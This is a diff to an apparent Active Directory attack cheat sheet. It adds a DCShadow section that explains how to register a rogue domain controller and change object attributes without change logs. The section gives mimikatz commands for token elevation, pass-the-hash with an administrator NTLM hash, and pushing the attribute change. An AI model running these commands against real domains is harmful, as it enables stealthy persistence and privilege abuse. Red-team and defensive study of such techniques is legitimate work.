@@ -920,13 +920,30 @@ CreateObject("ADODB.Connection").Open "Provider=SQLNCLI11;Data Source=DOESNOTEXI
 
 ### DCShadow
 
+**DCShadow temporarily registers a new domain controller in the target domain** and uses it to "push" attributes like SIDHistory, SPNs... on specified objects without leaving the change logs for modified object!
+
+*⚠️ Requirements :*
+- DA privileges are required to use DCShadow.
+- The attacker's machine must be part of the root domain.
+
+The attack needs 2 instances on a compromised machine :
+
+**1 instance :** *start RPC servers with SYSTEM privileges and specify attributes to be modified*
+```c
+mimikatz # !+
+mimikatz # !processtoken
+mimikatz # lsadump::dcshadow /object:root1user /attribute:Description /value="Hello from DCShadow"
+```
+
+**2 instance :** *with enough privileges of DA to push the values : 
+```bash
+mimikatz # sekurlsa::pth /user:Administrator /domain:$domain /ntlm:$admin_hash /impersonate
+mimikatz # lsadump::dcshadow /push
+```
 
 ## Cross Forest Attacks 
 
 ### Trust Tickets
-
-
-
 
 *Dumping Trust Key*
 ```powershell
